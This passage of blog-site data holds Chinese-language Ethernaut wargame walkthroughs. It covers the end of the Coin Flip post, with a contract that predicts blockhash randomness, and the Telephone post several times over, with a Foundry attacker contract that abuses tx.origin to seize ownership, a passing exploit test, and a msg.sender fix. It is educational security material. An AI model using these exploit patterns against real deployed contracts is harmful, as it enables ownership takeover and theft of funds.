class=\"line\">// 3. 使用合约自动化攻击</span><br><span class=\"line\"></span><br><span class=\"line\">contract SmartAttacker &#123;</span><br><span class=\"line\">    function conditionalAttack(CoinFlip target, bool guess) public &#123;</span><br><span class=\"line\">        // 预先计算</span><br><span class=\"line\">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class=\"line\">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class=\"line\">        bool predictedSide = coinFlip == 1 ? true : false;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 只在预测正确时才攻击</span><br><span class=\"line\">        if (predictedSide == guess) &#123;</span><br><span class=\"line\">            target.flip(guess);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        // 否则什么都不做，等待下一个有利机会</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-真随机数-vs-伪随机数\"><a href=\"#3-真随机数-vs-伪随机数\" class=\"headerlink\" title=\"3. 真随机数 vs 伪随机数\"></a>3. 真随机数 vs 伪随机数</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ 伪随机数（确定性）</span><br><span class=\"line\">function badRandom() public view returns (uint256) &#123;</span><br><span class=\"line\">    return uint256(keccak256(abi.encodePacked(</span><br><span class=\"line\">        block.timestamp,</span><br><span class=\"line\">        block.difficulty,</span><br><span class=\"line\">        msg.sender</span><br><span class=\"line\">    )));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 真随机数（使用预言机）</span><br><span class=\"line\">function goodRandom() public &#123;</span><br><span class=\"line\">    // 通过 Chainlink VRF 请求真正的随机数</span><br><span class=\"line\">    requestRandomness(keyHash, fee);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🏛️-历史案例\"><a href=\"#🏛️-历史案例\" class=\"headerlink\" title=\"🏛️ 历史案例\"></a>🏛️ 历史案例</h2><h3 id=\"著名的随机数攻击事件\"><a href=\"#著名的随机数攻击事件\" class=\"headerlink\" title=\"著名的随机数攻击事件\"></a>著名的随机数攻击事件</h3><ol>\n<li><p><strong>SmartBillions</strong> (2017)</p>\n<ul>\n<li>损失: 400 ETH</li>\n<li>原因: 使用 <code>block.blockhash</code> 作为随机源</li>\n<li>攻击: 预测未来区块哈希</li>\n</ul>\n</li>\n<li><p><strong>Fomo3D</strong> (2018)</p>\n<ul>\n<li>影响: 游戏机制被操控</li>\n<li>原因: 使用可预测的时间戳</li>\n<li>后果: 奖池分配不公</li>\n</ul>\n</li>\n<li><p><strong>TheRun</strong> (2019)</p>\n<ul>\n<li>损失: 大量代币</li>\n<li>原因: 复杂但仍可预测的随机数算法</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p>Coin Flip 关卡揭示了区块链随机数的根本问题：</p>\n<ul>\n<li>✅ <strong>区块链是确定性系统</strong> - 相同输入必然产生相同输出</li>\n<li>✅ <strong>透明性带来可预测性</strong> - 所有数据都是公开的</li>\n<li>✅ <strong>真随机数需要外部熵源</strong> - 必须依赖链下随机性</li>\n<li>✅ <strong>预言机是最佳解决方案</strong> - Chainlink VRF 等服务</li>\n</ul>\n<p>这个看似简单的猜硬币游戏，实际上涉及密码学、概率论和分布式系统的深层概念。理解其原理对于构建安全的智能合约至关重要。</p>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-02-fallout/\">上一关: Level 2 - Fallout</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-04-telephone/\">下一关: Level 4 - Telephone</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://docs.chain.link/vrf/v2/introduction\">Chainlink VRF 文档</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目</a></strong></li>\n</ul>\n<hr>\n<p><em>在区块链的确定性世界中，真正的随机性是一种珍贵的资源。</em> 🎲</p>\n"},{"title":"Ethernaut Level 4: Telephone - tx.origin vs msg.sender 身份验证绕过","date":"2025-01-25T07:00:00.000Z","updated":"2025-01-25T07:00:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"深入理解 tx.origin 和 msg.sender 的区别，学习如何利用中间合约绕过身份验证机制。","_content":"\n# 🎯 Ethernaut Level 4: Telephone - tx.origin vs msg.sender 身份验证绕过\n\n> **关卡链接**: [Ethernaut Level 4 - Telephone](https://ethernaut.openzeppelin.com/level/4)  \n> **攻击类型**: 身份验证绕过、中间合约攻击  \n> **难度**: ⭐⭐☆☆☆\n\n## 📋 挑战目标\n\n1. **获取合约控制权** - 成为 `Telephone` 合约的 `owner`\n2. **理解身份机制** - 掌握 `tx.origin` 和 `msg.sender` 的区别\n\n## 🔍 漏洞分析\n\n### 合约源码分析\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract Telephone {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function changeOwner(address _owner) public {\n        // 🚨 漏洞：使用 tx.origin 进行身份验证\n        if (tx.origin != msg.sender) {\n            owner = _owner;\n        }\n    }\n}\n```\n\n### 关键概念对比\n\n| 属性 | `msg.sender` | `tx.origin` |\n|------|--------------|-------------|\n| **定义** | 直接调用者 | 交易发起者 |\n| **变化** | 每次调用都可能变化 | 整个交易链中不变 |\n| **安全性** | ✅ 安全 | ❌ 危险 |\n| **推荐使用** | 身份验证 | 仅用于日志记录 |\n\n### 攻击原理\n\n当我们通过中间合约调用时：\n- `tx.origin` = 用户地址 (交易发起者)\n- `msg.sender` = 攻击合约地址 (直接调用者)\n- 由于 `tx.origin != msg.sender`，条件满足，可以修改 owner\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Telephone.sol\";\n\ncontract TelephoneAttacker {\n    Telephone public target;\n    \n    constructor(address _target) {\n        target = Telephone(_target);\n    }\n    \n    function attack(address _newOwner) public {\n        // 通过中间合约调用，使 tx.origin ≠ msg.sender\n        target.changeOwner(_newOwner);\n    }\n}\n\ncontract TelephoneTest is Test {\n    Telephone public telephone;\n    TelephoneAttacker public attacker;\n    \n    address public user = makeAddr(\"user\");\n    address public newOwner = makeAddr(\"newOwner\");\n\n    function setUp() public {\n        telephone = new Telephone();\n        attacker = new TelephoneAttacker(address(telephone));\n    }\n\n    function testTelephoneExploit() public {\n        vm.startPrank(user);\n        \n        // 通过中间合约攻击\n        attacker.attack(newOwner);\n        \n        vm.stopPrank();\n        \n        // 验证攻击成功\n        assertEq(telephone.owner(), newOwner);\n        console.log(\"Attack successful! New owner:\", telephone.owner());\n    }\n}\n```\n\n## 🛡️ 防御措施\n\n### 使用 msg.sender 进行身份验证\n\n```solidity\ncontract SecureTelephone {\n    address public owner;\n    \n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Not the owner\");\n        _;\n    }\n    \n    function changeOwner(address _newOwner) public onlyOwner {\n        owner = _newOwner;\n    }\n}\n```\n\n## 🎯 总结\n\nTelephone 关卡教导我们：\n- ✅ 永远不要使用 `tx.origin` 进行身份验证\n- ✅ 使用 `msg.sender` 进行安全的身份检查\n- ✅ 理解调用链中的身份传递机制\n\n---\n\n## 🔗 相关链接\n\n- **[上一关: Level 3 - Coin Flip](/2025/01/25/ethernaut-level-03-coinflip/)**\n- **[下一关: Level 5 - Token](/2025/01/25/ethernaut-level-05-token/)**\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**","source":"_posts/ethernaut-level-04-telephone.md","raw":"---\ntitle: 'Ethernaut Level 4: Telephone - tx.origin vs msg.sender 身份验证绕过'\ndate: 2025-01-25 15:00:00\nupdated: 2025-01-25 15:00:00\ncategories:\n  - Ethernaut 系列\n  - 基础攻击篇 (1-10)\ntags:\n  - Ethernaut\n  - Foundry\n  - tx.origin\n  - msg.sender\n  - 身份验证绕过\n  - 智能合约安全\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"深入理解 tx.origin 和 msg.sender 的区别，学习如何利用中间合约绕过身份验证机制。\"\n---\n\n# 🎯 Ethernaut Level 4: Telephone - tx.origin vs msg.sender 身份验证绕过\n\n> **关卡链接**: [Ethernaut Level 4 - Telephone](https://ethernaut.openzeppelin.com/level/4)  \n> **攻击类型**: 身份验证绕过、中间合约攻击  \n> **难度**: ⭐⭐☆☆☆\n\n## 📋 挑战目标\n\n1. **获取合约控制权** - 成为 `Telephone` 合约的 `owner`\n2. **理解身份机制** - 掌握 `tx.origin` 和 `msg.sender` 的区别\n\n## 🔍 漏洞分析\n\n### 合约源码分析\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract Telephone {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function changeOwner(address _owner) public {\n        // 🚨 漏洞：使用 tx.origin 进行身份验证\n        if (tx.origin != msg.sender) {\n            owner = _owner;\n        }\n    }\n}\n```\n\n### 关键概念对比\n\n| 属性 | `msg.sender` | `tx.origin` |\n|------|--------------|-------------|\n| **定义** | 直接调用者 | 交易发起者 |\n| **变化** | 每次调用都可能变化 | 整个交易链中不变 |\n| **安全性** | ✅ 安全 | ❌ 危险 |\n| **推荐使用** | 身份验证 | 仅用于日志记录 |\n\n### 攻击原理\n\n当我们通过中间合约调用时：\n- `tx.origin` = 用户地址 (交易发起者)\n- `msg.sender` = 攻击合约地址 (直接调用者)\n- 由于 `tx.origin != msg.sender`，条件满足，可以修改 owner\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Telephone.sol\";\n\ncontract TelephoneAttacker {\n    Telephone public target;\n    \n    constructor(address _target) {\n        target = Telephone(_target);\n    }\n    \n    function attack(address _newOwner) public {\n        // 通过中间合约调用，使 tx.origin ≠ msg.sender\n        target.changeOwner(_newOwner);\n    }\n}\n\ncontract TelephoneTest is Test {\n    Telephone public telephone;\n    TelephoneAttacker public attacker;\n    \n    address public user = makeAddr(\"user\");\n    address public newOwner = makeAddr(\"newOwner\");\n\n    function setUp() public {\n        telephone = new Telephone();\n        attacker = new TelephoneAttacker(address(telephone));\n    }\n\n    function testTelephoneExploit() public {\n        vm.startPrank(user);\n        \n        // 通过中间合约攻击\n        attacker.attack(newOwner);\n        \n        vm.stopPrank();\n        \n        // 验证攻击成功\n        assertEq(telephone.owner(), newOwner);\n        console.log(\"Attack successful! New owner:\", telephone.owner());\n    }\n}\n```\n\n## 🛡️ 防御措施\n\n### 使用 msg.sender 进行身份验证\n\n```solidity\ncontract SecureTelephone {\n    address public owner;\n    \n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Not the owner\");\n        _;\n    }\n    \n    function changeOwner(address _newOwner) public onlyOwner {\n        owner = _newOwner;\n    }\n}\n```\n\n## 🎯 总结\n\nTelephone 关卡教导我们：\n- ✅ 永远不要使用 `tx.origin` 进行身份验证\n- ✅ 使用 `msg.sender` 进行安全的身份检查\n- ✅ 理解调用链中的身份传递机制\n\n---\n\n## 🔗 相关链接\n\n- **[上一关: Level 3 - Coin Flip](/2025/01/25/ethernaut-level-03-coinflip/)**\n- **[下一关: Level 5 - Token](/2025/01/25/ethernaut-level-05-token/)**\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**","slug":"ethernaut-level-04-telephone","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbp2000gbf5q42ol9h3q","content":"<h1 id=\"🎯-Ethernaut-Level-4-Telephone-tx-origin-vs-msg-sender-身份验证绕过\"><a href=\"#🎯-Ethernaut-Level-4-Telephone-tx-origin-vs-msg-sender-身份验证绕过\" class=\"headerlink\" title=\"🎯 Ethernaut Level 4: Telephone - tx.origin vs msg.sender 身份验证绕过\"></a>🎯 Ethernaut Level 4: Telephone - tx.origin vs msg.sender 身份验证绕过</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/4\">Ethernaut Level 4 - Telephone</a><br><strong>攻击类型</strong>: 身份验证绕过、中间合约攻击<br><strong>难度</strong>: ⭐⭐☆☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><ol>\n<li><strong>获取合约控制权</strong> - 成为 <code>Telephone</code> 合约的 <code>owner</code></li>\n<li><strong>理解身份机制</strong> - 掌握 <code>tx.origin</code> 和 <code>msg.sender</code> 的区别</li>\n</ol>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"合约源码分析\"><a href=\"#合约源码分析\" class=\"headerlink\" title=\"合约源码分析\"></a>合约源码分析</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Telephone &#123;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function changeOwner(address _owner) public &#123;</span><br><span class=\"line\">        // 🚨 漏洞：使用 tx.origin 进行身份验证</span><br><span class=\"line\">        if (tx.origin != msg.sender) &#123;</span><br><span class=\"line\">            owner = _owner;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键概念对比\"><a href=\"#关键概念对比\" class=\"headerlink\" title=\"关键概念对比\"></a>关键概念对比</h3><table>\n<thead>\n<tr>\n<th>属性</th>\n<th><code>msg.sender</code></th>\n<th><code>tx.origin</code></th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>定义</strong></td>\n<td>直接调用者</td>\n<td>交易发起者</td>\n</tr>\n<tr>\n<td><strong>变化</strong></td>\n<td>每次调用都可能变化</td>\n<td>整个交易链中不变</td>\n</tr>\n<tr>\n<td><strong>安全性</strong></td>\n<td>✅ 安全</td>\n<td>❌ 危险</td>\n</tr>\n<tr>\n<td><strong>推荐使用</strong></td>\n<td>身份验证</td>\n<td>仅用于日志记录</td>\n</tr>\n</tbody></table>\n<h3 id=\"攻击原理\"><a href=\"#攻击原理\" class=\"headerlink\" title=\"攻击原理\"></a>攻击原理</h3><p>当我们通过中间合约调用时：</p>\n<ul>\n<li><code>tx.origin</code> &#x3D; 用户地址 (交易发起者)</li>\n<li><code>msg.sender</code> &#x3D; 攻击合约地址 (直接调用者)</li>\n<li>由于 <code>tx.origin != msg.sender</code>，条件满足，可以修改 owner</li>\n</ul>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Telephone.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract TelephoneAttacker &#123;</span><br><span class=\"line\">    Telephone public target;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(address _target) &#123;</span><br><span class=\"line\">        target = Telephone(_target);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function attack(address _newOwner) public &#123;</span><br><span class=\"line\">        // 通过中间合约调用，使 tx.origin ≠ msg.sender</span><br><span class=\"line\">        target.changeOwner(_newOwner);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract TelephoneTest is Test &#123;</span><br><span class=\"line\">    Telephone public telephone;</span><br><span class=\"line\">    TelephoneAttacker public attacker;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public user = makeAddr(&quot;user&quot;);</span><br><span class=\"line\">    address public newOwner = makeAddr(&quot;newOwner&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        telephone = new Telephone();</span><br><span class=\"line\">        attacker = new TelephoneAttacker(address(telephone));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testTelephoneExploit() public &#123;</span><br><span class=\"line\">        vm.startPrank(user);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 通过中间合约攻击</span><br><span class=\"line\">        attacker.attack(newOwner);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证攻击成功</span><br><span class=\"line\">        assertEq(telephone.owner(), newOwner);</span><br><span class=\"line\">        console.log(&quot;Attack successful! New owner:&quot;, telephone.owner());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"使用-msg-sender-进行身份验证\"><a href=\"#使用-msg-sender-进行身份验证\" class=\"headerlink\" title=\"使用 msg.sender 进行身份验证\"></a>使用 msg.sender 进行身份验证</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureTelephone &#123;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner() &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;Not the owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function changeOwner(address _newOwner) public onlyOwner &#123;</span><br><span class=\"line\">        owner = _newOwner;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p>Telephone 关卡教导我们：</p>\n<ul>\n<li>✅ 永远不要使用 <code>tx.origin</code> 进行身份验证</li>\n<li>✅ 使用 <code>msg.sender</code> 进行安全的身份检查</li>\n<li>✅ 理解调用链中的身份传递机制</li>\n</ul>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-03-coinflip/\">上一关: Level 3 - Coin Flip</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-05-token/\">下一关: Level 5 - Token</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目</a></strong></li>\n</ul>\n","more":"<h1 id=\"🎯-Ethernaut-Level-4-Telephone-tx-origin-vs-msg-sender-身份验证绕过\"><a href=\"#🎯-Ethernaut-Level-4-Telephone-tx-origin-vs-msg-sender-身份验证绕过\" class=\"headerlink\" title=\"🎯 Ethernaut Level 4: Telephone - tx.origin vs msg.sender 身份验证绕过\"></a>🎯 Ethernaut Level 4: Telephone - tx.origin vs msg.sender 身份验证绕过</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/4\">Ethernaut Level 4 - Telephone</a><br><strong>攻击类型</strong>: 身份验证绕过、中间合约攻击<br><strong>难度</strong>: ⭐⭐☆☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><ol>\n<li><strong>获取合约控制权</strong> - 成为 <code>Telephone</code> 合约的 <code>owner</code></li>\n<li><strong>理解身份机制</strong> - 掌握 <code>tx.origin</code> 和 <code>msg.sender</code> 的区别</li>\n</ol>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"合约源码分析\"><a href=\"#合约源码分析\" class=\"headerlink\" title=\"合约源码分析\"></a>合约源码分析</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Telephone &#123;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function changeOwner(address _owner) public &#123;</span><br><span class=\"line\">        // 🚨 漏洞：使用 tx.origin 进行身份验证</span><br><span class=\"line\">        if (tx.origin != msg.sender) &#123;</span><br><span class=\"line\">            owner = _owner;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键概念对比\"><a href=\"#关键概念对比\" class=\"headerlink\" title=\"关键概念对比\"></a>关键概念对比</h3><table>\n<thead>\n<tr>\n<th>属性</th>\n<th><code>msg.sender</code></th>\n<th><code>tx.origin</code></th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>定义</strong></td>\n<td>直接调用者</td>\n<td>交易发起者</td>\n</tr>\n<tr>\n<td><strong>变化</strong></td>\n<td>每次调用都可能变化</td>\n<td>整个交易链中不变</td>\n</tr>\n<tr>\n<td><strong>安全性</strong></td>\n<td>✅ 安全</td>\n<td>❌ 危险</td>\n</tr>\n<tr>\n<td><strong>推荐使用</strong></td>\n<td>身份验证</td>\n<td>仅用于日志记录</td>\n</tr>\n</tbody></table>\n<h3 id=\"攻击原理\"><a href=\"#攻击原理\" class=\"headerlink\" title=\"攻击原理\"></a>攻击原理</h3><p>当我们通过中间合约调用时：</p>\n<ul>\n<li><code>tx.origin</code> &#x3D; 用户地址 (交易发起者)</li>\n<li><code>msg.sender</code> &#x3D; 攻击合约地址 (直接调用者)</li>\n<li>由于 <code>tx.origin != msg.sender</code>，条件满足，可以修改 owner</li>\n</ul>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Telephone.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract TelephoneAttacker &#123;</span><br><span class=\"line\">    Telephone public target;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(address _target) &#123;</span><br><span class=\"line\">        target = Telephone(_target);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function attack(address _newOwner) public &#123;</span><br><span class=\"line\">        // 通过中间合约调用，使 tx.origin ≠ msg.sender</span><br><span class=\"line\">        target.changeOwner(_newOwner);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract TelephoneTest is Test &#123;</span><br><span class=\"line\">    Telephone public telephone;</span><br><span class=\"line\">    TelephoneAttacker public attacker;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public user = makeAddr(&quot;user&quot;);</span><br><span class=\"line\">    address public newOwner = makeAddr(&quot;newOwner&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        telephone = new Telephone();</span><br><span class=\"line\">        attacker = new TelephoneAttacker(address(telephone));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testTelephoneExploit() public &#123;</span><br><span class=\"line\">        vm.startPrank(user);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 通过中间合约攻击</span><br><span class=\"line\">        attacker.attack(newOwner);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span 